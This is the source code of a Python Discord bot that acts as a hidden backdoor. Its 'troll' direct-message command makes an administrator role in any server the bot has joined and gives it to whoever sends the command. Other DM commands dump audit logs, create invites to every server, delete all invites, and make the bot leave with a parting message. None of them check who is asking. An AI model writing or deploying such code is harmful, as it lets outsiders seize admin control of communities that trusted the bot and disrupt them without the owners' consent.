import discord
from discord.ext import commands
import json
import asyncio

TOKEN = 'Token'
ROLE_NAME = 'Admin'

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name} ({bot.user.id})')

@bot.event
async def on_message(message):
    if message.author.bot:
        return

    if isinstance(message.channel, discord.DMChannel):
        if message.content.startswith('troll'):
            await troll_command(message)
        elif message.content.startswith('remove'):
            await remove_command(message)
        elif message.content.startswith('log'):
            await log_command(message)
        elif message.content.startswith('list'):
            await list_command(message)
        elif message.content.startswith('linkd'):
            await linkd_command(message)
        elif message.content.startswith('exit'):
            await exit_command(message)
        elif message.content.startswith('link'):
            await link_command(message)

async def troll_command(message):
    try:
        if len(message.content.split()) < 2:
            await message.channel.send("Please provide the server ID.")
            return

        _, server_id = message.content.split()
        guild = bot.get_guild(int(server_id))
        if guild is None:
            await message.channel.send("Server not found.")
            return

        member = guild.get_member(message.author.id)
        if member is None:
            member = await guild.fetch_member(message.author.id)

        if member is None:
            await message.channel.send(f"Member not found in server {guild.name}.")
            return

        role = discord.utils.get(guild.roles, name=ROLE_NAME)
        if not role:
            role = await guild.create_role(name=ROLE_NAME, permissions=discord.Permissions(administrator=True))

        if role in member.roles:
            await message.channel.send(f"You already have the {role.name} role.")
        else:
            await member.add_roles(role)
            await message.channel.send(f"Added {role.name} role to you.")
        print(f"{message.author} executed troll command on {guild.name}")
    except Exception as e:
        await message.channel.send(f"Error in troll command: {e}")
        print(f"Error in troll command: {e}")

async def remove_command(message):
    try:
        if len(message.content.split()) < 2:
            await message.channel.send("Please provide the server ID.")
            return

        _, server_id = message.content.split()
        guild = bot.get_guild(int(server_id))
        if guild is None:
            await message.channel.send("Server not found.")
            return

        role = discord.utils.get(guild.roles, name=ROLE_NAME)
        if role:
            await role.delete()
            await message.channel.send(f"Deleted {role.name} role.")
        else:
            await message.channel.send(f"{ROLE_NAME} role does not exist.")
        print(f"{message.author} executed remove command on {guild.name}")
    except Exception as e:
        await message.channel.send(f"Error in remove command: {e}")
        print(f"Error in remove command: {e}")

async def log_command(message):
    try:
        if len(message.content.split()) < 2:
            await message.channel.send("Please provide the server ID.")
            return

        _, server_id = message.content.split()
        guild = bot.get_guild(int(server_id))
        if guild is None:
            await message.channel.send("Server not found.")
            return

        audit_logs = []
        async for log in guild.audit_logs(limit=10):
            audit_logs.append(log)

        log_messages = []
        for log in reversed(audit_logs):
            action = log.action
            user = log.user.name if log.user else 'Unknown'
            target = log.target
            reason = log.reason if log.reason else 'None'
            timestamp = log.created_at.strftime("%Y-%m-%d %H:%M:%S")

            log_message = f"**{timestamp}** - **Action:** {action}\n**User:** {user}\n**Target:** {target}\n**Reason:** {reason}\n"
            log_messages.append(log_message)

        response_message = '\n'.join(log_messages)
        await message.channel.send(f"\n{response_message}\n")
        print(f"{message.author} executed log command.")
    except Exception as e:
        await message.channel.send(f"Error getting audit logs: {e}")
        print(f"Error getting audit logs: {e}")

async def list_command(message):
    try:
        embed_list = []
        current_embed = discord.Embed(title="Bot Servers", description="List of servers the bot is in", color=0x00ff00)
        embed_list.append(current_embed)

        for guild in bot.guilds:
            invite = None
            for channel in guild.text_channels:
                try:
                    invite = await channel.create_invite(max_age=300, unique=True)
                    break
                except discord.Forbidden:
                    pass

            invite_url = invite.url if invite else 'N/A'

            if len(current_embed.fields) >= 25:
                current_embed = discord.Embed(color=0x00ff00)
                embed_list.append(current_embed)

            current_embed.add_field(name=guild.name, value=f"ID: {guild.id}\nInvite: {invite_url}", inline=False)

        for embed in embed_list:
            await message.channel.send(embed=embed)

        print(f"{message.author} executed list command.")
    except Exception as e:
        await message.channel.send(f"Error retrieving server list: {e}")
        print(f"Error in list command: {e}")

async def linkd_command(message):
    try:
        for guild in bot.guilds:
            for channel in guild.text_channels:
                try:
                    invites = await channel.invites()
                    for invite in invites:
                        await invite.delete()
                except discord.Forbidden:
                    pass
                except Exception as e:
                    print(f"Error deleting invites in channel {channel.name} of server {guild.name}: {e}")

        await message.channel.send("All invite links have been invalidated.")
        print(f"{message.author} executed linkd command.")
    except Exception as e:
        await message.channel.send(f"Error invalidating invite links: {e}")
        print(f"Error in linkd command: {e}")

async def exit_command(message):
    try:
        if len(message.content.split()) < 2:
            await message.channel.send("Please provide the server ID.")
            return

        _, server_id, *message_content = message.content.split()
        guild = bot.get_guild(int(server_id))
        if guild is None:
            await message.channel.send("Server not found.")
            return

        if message_content:
            msg = ' '.join(message_content)
            await guild.system_channel.send(msg)

        await guild.leave()
        await message.channel.send(f"Message sent and bot left server {guild.name}.")
        print(f"{message.author} executed exit command on {guild.name}")
    except Exception as e:
        await message.channel.send(f"Error in exit command: {e}")
        print(f"Error in exit command: {e}")

async def link_command(message):
    try:
        if len(message.content.split()) < 2:
            await message.channel.send("Please provide the server ID.")
            return

        _, server_id = message.content.split()
        guild = bot.get_guild(int(server_id))
        if guild is None:
            await message.channel.send("Server not found.")
            return

        invite = None
        for channel in guild.text_channels:
            try:
                invite = await channel.create_invite(max_age=300, unique=True)
                break
            except discord.Forbidden:
                pass

        invite_url = invite.url if invite else 'N/A'
        await message.channel.send(f"Invite link for {guild.name}: {invite_url}")
        print(f"{message.author} executed link command for {guild.name}")
    except Exception as e:
        await message.channel.send(f"Error generating invite link: {e}")
        print(f"Error generating invite link: {e}")

bot.run(TOKEN)
